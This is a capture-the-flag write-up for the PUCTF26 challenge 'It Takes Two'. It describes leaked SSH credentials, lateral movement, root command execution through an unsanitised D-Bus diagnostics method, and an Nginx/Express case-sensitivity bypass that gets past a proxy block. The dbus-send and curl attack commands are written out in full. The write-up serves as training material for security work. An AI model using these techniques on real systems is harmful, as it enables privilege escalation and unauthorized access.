# Write-up: Lateral Movement & Routing Mismatch (PUCTF26)

**Challenge:** It Takes Two
**Category:** Boot2Root / Web / Privilege Escalation  
**Author:** Cynthia 

Author: Yeung Wang Sang

## Summary

This challenge is a multi-stage Boot2Root puzzle. To retrieve the flag, we must navigate through several layers of security, requiring a combination of lateral movement, local privilege escalation (LPE), sandbox evasion (Living off the Land), and exploiting a web server routing mismatch.

The core exploit chain is:
1. Extract leaked SSH credentials from the initial `webapp` server.
2. Laterally move to a restricted `security` container to bypass an IP whitelist.
3. Exploit an insecure D-Bus service running as `root` for command execution.
4. Discover an Nginx reverse proxy that injects a required `X-Auth-Token` but blocks the target endpoint.
5. Exploit a case-sensitivity discrepancy between Nginx and Express.js to bypass the proxy's block rule and retrieve the flag.

---

## Step 1: Initial Recon & Lateral Movement

We start with a shell on the `webapp` server as the low-privileged user `player`. 

During initial reconnaissance, we uncover a Base64 encoded string:
```text
eyJob3N0Ijoic2VjdXJpdHkiLCJwb3J0IjoyMiwidXNlcm5hbWUiOiJtb25pdG9yIiwicGFzc3dvcmQiOiJNMG4xdDByX1MzY3VyM18yMDI2ISIsInB1cnBvc2UiOiJTU0ggYWNjZXNzIHRvIHNlY3VyaXR5IG1vbml0b3Jpbmcgc2VydmVyIGZvciBoZWFsdGggY2hlY2tzIn0=

Decoding this string reveals JSON-formatted credentials for an internal monitoring server: 
```json 
{
  "host": "security",
  "port": 22,
  "username": "monitor",
  "password": "M0n1t0r_S3cur3_2026!",
  "purpose": "SSH access to security monitoring server for health checks"
}
``` 
The target endpoint containing the flag is /admin_portal on the webapp, but it is protected by an IP restriction—it only accepts requests originating from the security server.

To bypass this IP whitelist, we use the decoded credentials to SSH into the security container: 

```bash
ssh monitor@security
# (Password: M0n1t0r_S3cur3_2026!)
``` 

## Step 2; D-Bus Privilege Escalation 
Once inside the security machine, we need to determine how it authenticates to the webapp to perform its "health checks."

Running ps aux reveals a suspicious Python script running with root privileges: 

``` Plaintext 
root      15  0.0  0.1  28828 18856 ?        S    04:05   0:00 python3 /opt/diagnostics/diagnostics-service.py 
```
Reading the source code of this script reveals a classic Local Privilege Escalation (LPE) vulnerability. It exposes a D-Bus method named RunDiagnostic that takes a string command and passes it directly to subprocess.run(shell=True) without any sanitization.

We can exploit this by using dbus-send to execute arbitrary commands as root. For example, verifying our access to the root directory: 
```bash 
dbus-send --system --print-reply --dest=com.security.diagnostics /com/security/diagnostics com.security.diagnostics.Interface.RunDiagnostic string:"ls -la /root" 
``` 
## Step 3: Extracting Secrets & Sandbox Trap 
Using our root D-Bus execution, we read the /root/.init script and discover that the container is heavily sandboxed:

The python3 binary is deleted immediately after the D-Bus service starts.

Standard tools like curl, wget, nc, bash, and apt-get are completely removed.

The D-Bus service is sandboxed by systemd, triggering OSError: [Errno 93] Protocol not available if we attempt to use Python's raw socket module to craft outbound HTTP requests.

However, the .init script also shows that Nginx is running. We use our D-Bus exploit to dump the Nginx configuration: 
``` 
dbus-send --system --print-reply --dest=com.security.diagnostics /com/security/diagnostics com.security.diagnostics.Interface.RunDiagnostic string:"grep -r . /etc/nginx/conf.d 2>/dev/null"
``` 
This reveals the critical reverse proxy configuration: 
```Nginx 
# Block direct access to admin_portal through the proxy
    location /admin_portal {
        return 403 "Access denied by security policy.\n";
    }
    # Proxy all requests to the vulnerable instance's web app
    location / {
        proxy_pass http://vulnerable:8000;
        
        # Inject the auth token for all proxied requests
        proxy_set_header X-Auth-Token "S3cur1ty_M0n1t0r_T0k3n_X9K2!";
    }
``` 
##Step 4: The Routing Mismatch Bypass (The Final Exploit)
We notice a fatal discrepancy in how the frontend proxy (Nginx) and the backend application (Express.js) parse URLs:

Nginx is case-sensitive by default. It only blocks the exact string /admin_portal.

Express.js (Node) on the backend is case-insensitive by default. It treats /Admin_portal identically to /admin_portal.

Since we cannot send the request from inside the locked-down security container, we simply exit our SSH session and return to the webapp server, where standard tools like curl are available.

From the webapp server, we send a request to the security proxy using an uppercase A:
```bash 
player@webapp:~$ curl -s http://security/Admin_portal
``` 
The Exploit Flow:

Our curl request hits the Nginx proxy on the security container.

Nginx checks location /admin_portal. Because /Admin_portal != /admin_portal, the block rule fails to trigger.

Nginx falls through to the default location / block, injects the secret header (X-Auth-Token: S3cur1ty_M0n1t0r_T0k3n_X9K2!), and proxies the request back to the webapp:8000 backend.

The Express backend receives the request for /Admin_portal. It checks its routes case-insensitively, matches the request to the /admin_portal logic, verifies the injected token and correct source IP, and returns the flag! 

## Flag 
The final payload successfully returns the authorized data: 
``` json 
{"status":"authorized","data":"PUCTF26{1t_t4k3s_tw0_t0_t4ng0_kIfuepoLyWIbluXTACaz3CIwRGNb3C38}"}
``` 



